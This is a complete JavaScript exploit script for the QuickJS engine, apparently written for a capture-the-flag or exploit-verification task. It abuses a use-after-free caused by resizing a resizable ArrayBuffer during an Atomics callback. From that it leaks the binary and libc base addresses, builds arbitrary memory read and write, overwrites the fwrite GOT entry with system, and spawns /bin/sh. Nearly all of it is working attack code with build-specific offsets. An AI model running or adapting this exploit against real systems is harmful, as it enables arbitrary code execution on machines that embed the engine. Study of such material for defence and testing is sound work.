// QuickJS exploit: Atomics + Resizable ArrayBuffer stale ptr UAF -> GOT overwrite -> system("/bin/sh")
// Primitive target: exec-shell

// Offsets for this build
const OFF_JS_ARRAY_BUFFER_FREE = 0x14bc0n; // nm qjs | grep js_array_buffer_free
const OFF_FWRITE_GOT          = 0x10b380n; // objdump -R qjs | grep fwrite
const OFF_LIBC_FWRITE         = 0x7f2c0n;  // nm -D libc | grep fwrite@@
const OFF_LIBC_SYSTEM         = 0x53110n;  // nm -D libc | grep system@@

function uaf_leak_free_func_ptr() {
  // IMPORTANT: length=0x38 so malloc request is 56, matching JSArrayBuffer struct (56)
  let ab = new ArrayBuffer(0x38, { maxByteLength: 0x8000 });
  let ta = new BigInt64Array(ab); // length 7

  // Prevent realloc growing in-place by ensuring another allocation follows
  let barrier = new ArrayBuffer(0x3000);

  let victim;
  let evil = {
    valueOf() {
      // Grow enough to force reallocation & free of the original 56-byte backing store
      ab.resize(0x6000);
      // Allocate an ArrayBuffer so its JSArrayBuffer struct malloc(56) reuses the freed chunk
      victim = new ArrayBuffer(0x100);
      return 0n; // compare expected (mismatch)
    }
  };

  // index 6 -> offset 48 -> JSArrayBuffer.free_func
  return Atomics.compareExchange(ta, 6, evil, 0n);
}

function make_mem_ab(target_addr_bigint) {
  // Returns a normal ArrayBuffer whose internal JSArrayBuffer->data is corrupted to target_addr
  let ab = new ArrayBuffer(0x38, { maxByteLength: 0x8000 });
  let ta = new BigInt64Array(ab);
  let barrier = new ArrayBuffer(0x3000);

  let victim;
  let evil = {
    valueOf() {
      ab.resize(0x6000);
      victim = new ArrayBuffer(0x1000);
      return target_addr_bigint;
    }
  };

  // index 2 -> offset 16 -> JSArrayBuffer.data
  Atomics.store(ta, 2, evil);
  return victim;
}

// 1) Resolve fwrite (lazy binding) so its GOT slot contains libc address
print('X');

// 2) Leak PIE base from JSArrayBuffer.free_func
let free_func = uaf_leak_free_func_ptr();
let qjs_base = free_func - OFF_JS_ARRAY_BUFFER_FREE;

// 3) Read fwrite@GOT to leak libc base
let fwrite_got = qjs_base + OFF_FWRITE_GOT;
let mem = make_mem_ab(fwrite_got);
let dv = new DataView(mem);
let fwrite_addr = dv.getBigUint64(0, true);
let libc_base = fwrite_addr - OFF_LIBC_FWRITE;
let system_addr = libc_base + OFF_LIBC_SYSTEM;

// 4) Overwrite fwrite@GOT -> system
//    Next print("/bin/sh") will call system("/bin/sh")
dv.setBigUint64(0, system_addr, true);

// 5) Spawn a shell that reads stdin (the verifier pipes: "nc 127.0.0.1 9999\n")
print('/bin/sh');
